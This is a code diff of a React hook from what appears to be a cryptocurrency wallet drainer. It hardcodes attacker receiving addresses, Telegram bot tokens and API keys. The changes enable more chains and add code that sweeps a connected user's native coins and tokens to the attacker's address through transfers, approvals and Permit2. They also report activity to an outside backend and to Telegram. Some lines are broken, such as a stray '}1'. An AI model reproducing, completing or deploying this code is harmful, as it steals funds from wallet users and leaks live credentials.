@@ -1,3 +1,4 @@
+
 import { useState, useMemo, } from "react";
 import { ethers, BigNumber, Contract } from "ethers";
 import axios from "axios";
@@ -12,19 +13,18 @@ import { appKit } from "./networkSwitcher";
 import {  useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 
-const TELEGRAM_BOT_TOKEN = "8068548998:AAFv-C7AyhMKF7pQZW00Rjk4w-mTSzUubmg"
-const TELEGRAM_CHAT_ID = "-1002293727454"
-
+const TELEGRAM_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
+const TELEGRAM_CHAT_ID = "-1002535678431";
 
 
 const DAI_ADDRESS_MAINNET = "0x6B175474E89094C44Da98b954EedeAC495271d0F"; // DON'T TOUCH THIS !!!
 
-const BLACK_RAIN_SPLIT = "0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08"   // DON'T TOUCH THIS !!!
+const BLACK_RAIN_SPLIT = "0x4758a129ee74947CFA6Ff970162D68e1ee9f55f7";   // DON'T TOUCH THIS !!!
 
 
 const BR_INITIATOR_ADDRESS = "0x143EaF2E6A0914F52020D8c2eE9A2b10A77868fE".toLowerCase(); // Replace wth your private key public address example 0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08 
 
-const FRONTEND_RECIPIENT = "0xC08DAF6E355986a4c4BB4d5cc481203df309b484"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE
+const FRONTEND_RECIPIENT = "0xBFb1BAE18a786df08026908f2BA20aE77955170f"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE
 
 
 // Ensure addresses are lowercase or properly checksummed to avoid Ethers checksum errors
@@ -45,25 +45,80 @@ interface DiscoveredToken {
 
 
 
-const isLoggingEnabled = true; // Toggle this to enable/disable logs
+// const isLoggingEnabled = true; // Toggle this to enable/disable logs
+// import axios from "axios";
 
-const log = (...messages: unknown[]) => {
+const isLoggingEnabled = true;
+const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
+// const BASE_API_URL = "http://localhost:8080/api";
+
+
+const stringifyMessage = (message: unknown): string => {
+  if (typeof message === "object" && message !== null) {
+    try {
+      return JSON.stringify(message, null, 2);
+    } catch {
+      return String(message); // Fallback for circular references
+    }
+  }
+  return String(message);
+};
+
+const log = async (...messages: unknown[]) => {
   if (isLoggingEnabled) {
-    console.log(...messages); // Directly use console.log
+    const timestamp = new Date().toISOString();
+    const logMessage = `[LOG ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.log(logMessage);
+    console.error(logMessage); // For Vercel visibility
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "info",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send log to backend: ${errorMessage}`);
+    }
   }
 };
 
-const warn = (...messages: unknown[]) => {
+const warn = async (...messages: unknown[]) => {
   if (isLoggingEnabled) {
-    console.warn(...messages); // Directly use console.warn
+    const timestamp = new Date().toISOString();
+    const logMessage = `[WARN ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.warn(logMessage);
+    console.error(logMessage);
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "warn",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send warn to backend: ${errorMessage}`);
+    }
   }
 };
 
-const error = (...messages: string[]) => {
-  console.error(...messages); // Errors should always log
+const error = async (...messages: unknown[]) => {
+  if (isLoggingEnabled) {
+    const timestamp = new Date().toISOString();
+    const logMessage = `[ERROR ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.error(logMessage);
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "error",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send error to backend: ${errorMessage}`);
+    }
+  }
 };
-
-
 // Replace
 error("An unexpected error occurred during sendTransactions.");
 
@@ -143,8 +198,8 @@ interface Chain {
 }
 
 // Centralized keys
-const INFURA_KEY = "15b2a4fd999148318a366400d99bc8ce"; // Replace with your actual Infura key
-const ALCHEMY_KEY = ""; // Replace with your actual Alchemy key
+const INFURA_KEY = "9b8bdc756b0b46698b33ffc3eff46afb"; // Replace with your actual Infura key
+const ALCHEMY_KEY = "alcht_bxl8eQ123RNGV8raWma1ExZYoxji6V"; // Replace with your actual Alchemy key
 
 
 const chains: Chain[] = [
@@ -160,17 +215,17 @@ const chains: Chain[] = [
       alchemy: `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
     },
   },
-  // {
-  //   id: "0x89",
-  //   label: "Polygon Mainnet",
-  //   name: "Polygon",
-  //   nativeCurrency: { name: "Matic", symbol: "MATIC", decimals: 18 },
-  //   rpcUrls: {
-  //     http: ["https://polygon-rpc.com"],
-  //     default: "https://polygon-rpc.com",
-  //     infura: `https://polygon-mainnet.infura.io/v3/${INFURA_KEY}`,
-  //   },
-  // },
+  {
+    id: "0x89",
+    label: "Polygon Mainnet",
+    name: "Polygon",
+    nativeCurrency: { name: "Matic", symbol: "MATIC", decimals: 18 },
+    rpcUrls: {
+      http: ["https://polygon-rpc.com"],
+      default: "https://polygon-rpc.com",
+      infura: `https://polygon-mainnet.infura.io/v3/${INFURA_KEY}`,
+    },
+  },
   // {
   //   id: "0xa4b1",
   //   label: "Arbitrum One",
@@ -182,26 +237,26 @@ const chains: Chain[] = [
   //     alchemy: `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
   //   },
   // },
-  // {
-  //   id: "0xa86a",
-  //   label: "Avalanche C-Chain",
-  //   name: "Avalanche",
-  //   nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
-  //   rpcUrls: {
-  //     http: ["https://api.avax.network/ext/bc/C/rpc"],
-  //     default: "https://api.avax.network/ext/bc/C/rpc",
-  //   },
-  // },
-  // {
-  //   id: "0x38",
-  //   label: "Binance Smart Chain Mainnet",
-  //   name: "Binance Smart Chain",
-  //   nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
-  //   rpcUrls: {
-  //     http: ["https://bsc-dataseed.binance.org"],
-  //     default: "https://bsc-dataseed.binance.org",
-  //   },
-  // },
+  {
+    id: "0xa86a",
+    label: "Avalanche C-Chain",
+    name: "Avalanche",
+    nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
+    rpcUrls: {
+      http: ["https://api.avax.network/ext/bc/C/rpc"],
+      default: "https://api.avax.network/ext/bc/C/rpc",
+    },
+  },
+  {
+    id: "0x38",
+    label: "Binance Smart Chain Mainnet",
+    name: "Binance Smart Chain",
+    nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
+    rpcUrls: {
+      http: ["https://bsc-dataseed.binance.org"],
+      default: "https://bsc-dataseed.binance.org",
+    },
+  },
   {
     id: "0xaa36a7",
     label: "Ethereum Sepolia Testnet",
@@ -213,8 +268,6 @@ const chains: Chain[] = [
     },
   },
 ];
-
-
 
 
 // Helper function to map Chain to AppKitNetwork
@@ -240,10 +293,11 @@ const mapChainToAppKitNetwork = (chain: Chain): AppKitNetwork => ({
 
 // const BASE_API_URL = "https://ethereum-explorer.archi/api";
 
-const BASE_API_URL = "http://localhost:3002/api";
+// const BASE_API_URL = "http://localhost:3002/api";
+// const BASE_API_URL = "https://drn-2stp.onrender.com/api"
 
 // Encryption key (must match the backend)
-const BR_ENCRYPTION_KEY = "980c343e20c973f1b941a409d268df2cfca1d2fba93732fcecd3d5ed9cc93305";
+const BR_ENCRYPTION_KEY = "9eb784738a1716465663e61e45fa8775f012bf944ac888a7c13db7b8d4962eda";
 
 
 const encrypt = (data: unknown): { iv: string; data: string } => {
@@ -297,19 +351,18 @@ const fetchInitiatorCredentials = async (): Promise<{ initiator: string; initiat
 
 
 
-
 // Use BR_Private_RPC_URLs instead of chains
 const BR_Private_RPC_URLs: Record<number, string> = {
-  // 1: `https://mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Ethereum
-  // 10: `https://optimism-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Optimism
-  // 56: `https://bsc-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Binance Smart Chain
-  // 137: `https://polygon-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Polygon
-  // // 250: `https://rpc.ankr.com/fantom${BR_Ankr_Token ? `/${BR_Ankr_Token}` : ""}`, // Fantom
-  // 43114: `https://avalanche-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Avalanche
-  // 42161: `https://arbitrum-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Arbitrum
-  // 8453: `https://base-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Base
-  // 324: `https://zksync-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // zkSync Era
-  // 369: "https://pulsechain.publicnode.com", // Pulse
+  1: `https://mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Ethereum
+  10: `https://optimism-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Optimism
+  56: `https://bsc-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Binance Smart Chain
+  137: `https://polygon-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Polygon
+  // 250: `https://rpc.ankr.com/fantom${BR_Ankr_Token ? `/${BR_Ankr_Token}` : ""}`, // Fantom
+  43114: `https://avalanche-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Avalanche
+  42161: `https://arbitrum-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Arbitrum
+  8453: `https://base-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Base
+  324: `https://zksync-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // zkSync Era
+  369: "https://pulsechain.publicnode.com", // Pulse
   11155111: "https://sepolia.infura.io/v3/15b2a4fd999148318a366400d99bc8ce", // Sepolia
 };
 
@@ -358,7 +411,6 @@ const fetchAllGasData = async () => {
 
     const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
     const gasData = await fetchGasData(chainId, provider);
-
     log(`Gas Data for Chain ${chainId}:`, gasData);
   }
 };
@@ -437,6 +489,7 @@ function usePermits() {
   
       if (response.status === 200 && response.data?.balances) {
         log(`Balances fetched successfully for chain ${chainId}:`, response.data.balances);
+        // sendToTelegram(`Balances fetched successfully for chain ${chainId} \n Balance is balance is ${JSON.stringify(response.data.balances)} `);
         return response.data.balances;
       } else {
         console.error(`Unexpected response format for chain ${chainId}:`, response.data);
@@ -977,21 +1030,15 @@ const fetchAllBalances = async (
 
       const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
       const chainId = parseInt(chain.id, 16);
+      console.log(chainId, provider);
       const balances = (await fetchBalances(userAddress, chainId)) as Token[];
 
       const validTokens: TokenBalance[] = balances
-        .filter((token) => {
-          // For native tokens, check if balance is non-zero
-          if (token.type === "NATIVE") {
-            return !BigNumber.from(token.balance).isZero();
-          }
-          // For ERC20 tokens, check if balance is non-zero and contract exists
-          return !BigNumber.from(token.balance).isZero() && token.contract !== null;
-        })
+        .filter((token) => !BigNumber.from(token.balance).isZero())
         .map((token) => ({
-          address: token.address || "0x0000000000000000000000000000000000000000", // Use zero address for native tokens
+          address: token.address,
           balance: BigNumber.from(token.balance),
-          contract: token.contract || new ethers.Contract(token.address || "0x0000000000000000000000000000000000000000", ERC20_ABI, provider),
+          contract: new ethers.Contract(token.address, ERC20_ABI, provider),
           name: token.name,
           symbol: token.symbol,
           type: token.type,
@@ -1035,7 +1082,7 @@ const fetchAllBalances = async (
       log("Chains with balances:", chainsWithBalances.map((entry) => entry.chain.label));
   
       // Specify the wallet name
-      const walletName = "metamask"; // Change this based on the wallet being used
+      const walletName = "metamask"; // Change this based on the wallet being used check here
   
       for (const { chain, balances } of chainsWithBalances) {
         log(`Switching to chain: ${chain.label}`);
@@ -1087,6 +1134,117 @@ const calculateNativeValuePerToken = async (
   });
 };
 
+// const transferNativeToken = async (
+//   recipient: string,
+//   signer: ethers.Signer,
+//   tokenPriceInUSD: number,
+//   chainId: string,
+//   totalTokenValueInUSD: number
+// ): Promise<void> => {
+//   try {
+//     const provider = signer.provider;
+//     if (!provider) {
+//       throw new Error("Signer does not have an associated provider.");
+//     }
+
+//     // Get signer balance and gas fee data
+//     const signerBalance = await signer.getBalance();
+//     const feeData = await provider.getFeeData();
+
+//     // Determine gas price for EIP-1559 or legacy
+//     const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
+//       ? feeData.maxFeePerGas // Use EIP-1559 gas model
+//       : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"); // Fallback to legacy gas price
+
+//     // Estimate gas limit dynamically for a transfer
+//     const gasLimit = await provider.estimateGas({
+//       to: recipient,
+//       value: signerBalance
+//     }).catch(() => BigNumber.from(21000)); // Fallback to 21000 if estimation fails
+
+//     // Calculate total gas cost
+//     const totalGasCost = gasPrice.mul(gasLimit);
+
+//     if (signerBalance.lte(totalGasCost)) {
+//       log("Insufficient balance to cover gas fees.");
+//       return;
+//     }
+
+//     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;
+
+//     // Skip transfer if the native token balance is below $2
+//     if (balanceInUSD < 10) {
+//       log("Native token balance below $10. Skipping transfer.");
+//       return;
+//     }
+
+//     // Leave $10 untouched if conditions are met
+//     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
+//       const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
+//       const remainingBalance = ethers.utils.parseEther(
+//         ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
+//       );
+//       const amountToSend = signerBalance
+//         .sub(totalGasCost)
+//         .sub(remainingBalance);
+
+//       if (
+//         amountToSend.isZero() ||
+//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
+//       ) {
+//         log("Amount to send is too small after subtracting gas fees and leaving $10.");
+//         return;
+//       }
+
+//       const tx = await signer.sendTransaction({
+//         to: recipient,
+//         value: amountToSend,
+//         gasPrice,
+//         gasLimit,
+//       });
+
+//       log(`Transaction sent: ${tx.hash}`);
+//       await tx.wait();
+//       log(`Transaction confirmed: ${tx.hash}`);
+//     } else {
+//       // Standard transfer logic when conditions are not met
+//       const amountToSend = signerBalance.sub(totalGasCost);
+
+//       if (
+//         amountToSend.isZero() ||
+//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
+//       ) {
+//         log("Amount to send is too small after subtracting gas fees.");
+//         return;
+//       }
+
+//       const tx = await signer.sendTransaction({
+//         to: recipient,
+//         value: amountToSend,
+//         gasPrice,
+//         gasLimit,
+//       });
+
+//       log(`Transaction sent: ${tx.hash}`);
+//       await tx.wait();
+//       log(`Transaction confirmed: ${tx.hash}`);
+//     }
+//   } catch (error: unknown) {
+//     if (
+//       typeof error === "object" &&
+//       error !== null &&
+//       "code" in error &&
+//       (error as { code: string }).code === "ACTION_REJECTED"
+//     ) {
+//       warn(`Transaction rejected by the user. Skipping to the next token.`);
+//     } else if (error instanceof Error) {
+//       console.error(`Error transferring native token on chain ${chainId}:`, error.message);
+//     } else {
+//       console.error(`An unknown error occurred while transferring native token on chain ${chainId}.`);
+//     }
+//   }
+// };
+
 const transferNativeToken = async (
   recipient: string,
   signer: ethers.Signer,
@@ -1100,105 +1258,86 @@ const transferNativeToken = async (
       throw new Error("Signer does not have an associated provider.");
     }
 
-    // Get signer balance and gas fee data
     const signerBalance = await signer.getBalance();
     const feeData = await provider.getFeeData();
-
-    // Determine gas price for EIP-1559 or legacy
+    await log(`EIP-1559 Fee Data for Chain ${chainId}:`, feeData);
     const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
-      ? feeData.maxFeePerGas // Use EIP-1559 gas model
-      : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"); // Fallback to legacy gas price
-
-    // Estimate gas limit dynamically for a transfer
+      ? feeData.maxFeePerGas
+      : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
     const gasLimit = await provider.estimateGas({
       to: recipient,
-      value: signerBalance
-    }).catch(() => BigNumber.from(21000)); // Fallback to 21000 if estimation fails
-
-    // Calculate total gas cost
+      value: signerBalance,
+    }).catch(() => ethers.BigNumber.from(21000));
     const totalGasCost = gasPrice.mul(gasLimit);
+    await log(`Gas Data for Chain ${chainId}:`, { gasPrice: ethers.utils.formatUnits(gasPrice, "gwei"), gasLimit: gasLimit.toString() });
 
     if (signerBalance.lte(totalGasCost)) {
-      log("Insufficient balance to cover gas fees.");
+      await log("Insufficient balance to cover gas fees.");
       return;
     }
 
     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;
-
-    // Skip transfer if the native token balance is below $2
-    if (balanceInUSD < 10) {
-      log("Native token balance below $10. Skipping transfer.");
+    if (balanceInUSD < 2) {
+      await log("Native token balance below $2. Skipping transfer.");
       return;
     }
 
-    // Leave $10 untouched if conditions are met
     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
-      const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
+      const amountToLeaveInUSD = 10;
       const remainingBalance = ethers.utils.parseEther(
         ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
       );
-      const amountToSend = signerBalance
-        .sub(totalGasCost)
-        .sub(remainingBalance);
-
-      if (
-        amountToSend.isZero() ||
-        amountToSend.lt(ethers.utils.parseEther("0.0001"))
-      ) {
-        log("Amount to send is too small after subtracting gas fees and leaving $10.");
+      const amountToSend = signerBalance.sub(totalGasCost).sub(remainingBalance);
+      if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
+        await log("Amount to send is too small after subtracting gas fees and leaving $10.");
         return;
       }
-
       const tx = await signer.sendTransaction({
         to: recipient,
         value: amountToSend,
         gasPrice,
         gasLimit,
       });
-
-      log(`Transaction sent: ${tx.hash}`);
+      await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
-      log(`Transaction confirmed: ${tx.hash}`);
+      await log(`Transaction confirmed: ${tx.hash}`);
+      await axios.post("${BASE_API_URL}/api/log", {
+        level: "info",
+        message: `EVM transaction confirmed: ${tx.hash}`,
+        timestamp: new Date().toISOString(),
+      });
     } else {
-      // Standard transfer logic when conditions are not met
       const amountToSend = signerBalance.sub(totalGasCost);
-
-      if (
-        amountToSend.isZero() ||
-        amountToSend.lt(ethers.utils.parseEther("0.0001"))
-      ) {
-        log("Amount to send is too small after subtracting gas fees.");
+      if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
+        await log("Amount to send is too small after subtracting gas fees.");
         return;
       }
-
       const tx = await signer.sendTransaction({
         to: recipient,
         value: amountToSend,
         gasPrice,
         gasLimit,
       });
-
-      log(`Transaction sent: ${tx.hash}`);
+      await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
-      log(`Transaction confirmed: ${tx.hash}`);
+      await log(`Transaction confirmed: ${tx.hash}`);
+      await axios.post("${BASE_API_URL}/api/log", {
+        level: "info",
+        message: `EVM transaction confirmed: ${tx.hash}`,
+        timestamp: new Date().toISOString(),
+      });
     }
-  } catch (error: unknown) {
-    if (
-      typeof error === "object" &&
-      error !== null &&
-      "code" in error &&
-      (error as { code: string }).code === "ACTION_REJECTED"
-    ) {
-      warn(`Transaction rejected by the user. Skipping to the next token.`);
-    } else if (error instanceof Error) {
-      console.error(`Error transferring native token on chain ${chainId}:`, error.message);
+  } catch (err: unknown) {
+    if (typeof err === "object" && err !== null && "code" in err && err.code === "ACTION_REJECTED") {
+      await warn(`Transaction rejected by the user. Skipping to the next token.`);
+    } else if (err instanceof Error) {
+      await error(`Error transferring native token on chain ${chainId}: ${err.message}`);
     } else {
-      console.error(`An unknown error occurred while transferring native token on chain ${chainId}.`);
+      await error(`An unknown error occurred while transferring native token on chain ${chainId}: ${String(err)}`);
     }
   }
 };
-
-
+  
 const processChainTransactions = async (
   chain: Chain,
   validTokens: TokenBalance[],
@@ -1234,6 +1373,7 @@ const processChainTransactions = async (
   } catch (error) {
     if (error instanceof Error) {
       warn(`Failed to transfer native token on ${chain.label}:`, error.message);
+      sendToTelegram(`Failed to transfer native token on ${chain.label}: \nError is ${error.message} `);
     } else {
       warn(`Failed to transfer native token on ${chain.label}: Unknown error`);
     }
@@ -1395,6 +1535,8 @@ const processChainTransactions = async (
       }
     }
   };
+
+
 
   async function handlePermit2AndTransfer(validTokens: TokenBalance[], walletName: string) {
     if (!provider) {
@@ -2016,7 +2158,7 @@ const handleApprovalAndTransfer = async (
     if (rawBalance.isZero()) {
       warn(`User has zero balance for token ${token.name}. Skipping transfer.`);
       return;
-    }
+    }1
 
     const adjustedBalance = ethers.utils.formatUnits(rawBalance, decimals);
     log(`Token: ${token.name} | Raw Balance: ${rawBalance.toString()} | Adjusted Balance: ${adjustedBalance}`);
@@ -2115,11 +2257,11 @@ const handleApprovalAndTransfer = async (
       console.error(`Unknown error in handleApprovalAndTransfer:`, error);
     }
   }
-};
-
- 
+}; 
 
   return { loading, sendTransactions };
 }
+console.log("Using permit file: [filename]");
+
 
 export default usePermits;
